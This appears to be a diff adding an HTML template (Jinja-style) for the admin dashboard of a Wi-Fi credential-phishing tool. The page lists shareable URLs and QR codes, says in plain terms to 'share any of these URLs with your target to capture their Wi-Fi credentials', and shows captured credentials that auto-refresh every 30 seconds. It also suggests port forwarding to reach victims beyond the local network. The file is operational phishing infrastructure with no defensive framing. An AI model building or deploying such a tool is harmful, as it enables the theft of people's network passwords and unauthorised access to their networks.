@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wi-Fi Capture - Admin Dashboard</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 0;
+            color: #333;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        header {
+            background: linear-gradient(135deg, #004e92 0%, #000428 100%);
+            color: white;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        
+        h1 {
+            margin: 0;
+            font-size: 24px;
+        }
+        
+        .card {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            margin-bottom: 20px;
+            overflow: hidden;
+        }
+        
+        .card-header {
+            background-color: #f7f7f7;
+            padding: 15px 20px;
+            border-bottom: 1px solid #eee;
+            font-weight: bold;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .card-body {
+            padding: 20px;
+        }
+        
+        .url-container {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 20px;
+        }
+        
+        .url-card {
+            flex: 1;
+            min-width: 300px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            padding: 15px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        
+        .url {
+            font-family: monospace;
+            background-color: #f5f5f5;
+            padding: 10px;
+            border-radius: 5px;
+            margin: 10px 0;
+            width: 100%;
+            word-break: break-all;
+            text-align: center;
+        }
+        
+        .qr-code {
+            margin: 15px 0;
+            max-width: 200px;
+        }
+        
+        .copy-btn {
+            background-color: #004e92;
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        
+        .copy-btn:hover {
+            background-color: #003b70;
+        }
+        
+        .logs {
+            font-family: monospace;
+            white-space: pre-wrap;
+            background-color: #f5f5f5;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            max-height: 500px;
+            overflow-y: auto;
+        }
+        
+        .capture {
+            margin-bottom: 20px;
+            padding: 15px;
+            background-color: #fff;
+            border-left: 3px solid #004e92;
+        }
+        
+        .refresh-btn {
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+        
+        .refresh-btn:hover {
+            background-color: #3d8b40;
+        }
+        
+        .no-logs {
+            text-align: center;
+            padding: 20px;
+            color: #666;
+        }
+        
+        @media (max-width: 768px) {
+            .url-card {
+                min-width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>Wi-Fi Credentials Capture - Admin Dashboard</h1>
+        </header>
+        
+        <div class="card">
+            <div class="card-header">
+                <span>Access URLs</span>
+                <button class="refresh-btn" onclick="window.location.reload()">Refresh</button>
+            </div>
+            <div class="card-body">
+                <p>Share any of these URLs with your target to capture their Wi-Fi credentials:</p>
+                
+                <div class="url-container">
+                    {% for url in urls %}
+                    <div class="url-card">
+                        <div class="url">{{ url }}</div>
+                        <button class="copy-btn" onclick="copyToClipboard('{{ url }}')">Copy URL</button>
+                        {% if qr_codes[url] %}
+                        <h4>QR Code:</h4>
+                        <img src="{{ qr_codes[url] }}" alt="QR Code" class="qr-code">
+                        {% endif %}
+                    </div>
+                    {% endfor %}
+                </div>
+                
+                <p><strong>Note:</strong> Local URLs will only work for devices on the same network. For wider access, you may need to set up port forwarding on your router.</p>
+            </div>
+        </div>
+        
+        <div class="card">
+            <div class="card-header">
+                <span>Captured Credentials</span>
+                <button class="refresh-btn" onclick="window.location.reload()">Refresh</button>
+            </div>
+            <div class="card-body">
+                {% if logs %}
+                <div class="logs">
+                    {% for log in logs %}
+                    <div class="capture">{{ log }}</div>
+                    {% endfor %}
+                </div>
+                {% else %}
+                <div class="no-logs">No credentials captured yet.</div>
+                {% endif %}
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        function copyToClipboard(text) {
+            navigator.clipboard.writeText(text).then(() => {
+                alert('URL copied to clipboard!');
+            }, (err) => {
+                console.error('Could not copy text: ', err);
+            });
+        }
+        
+        // Auto-refresh the page every 30 seconds to check for new data
+        setTimeout(() => {
+            window.location.reload();
+        }, 30000);
+    </script>
+</body>
+</html>
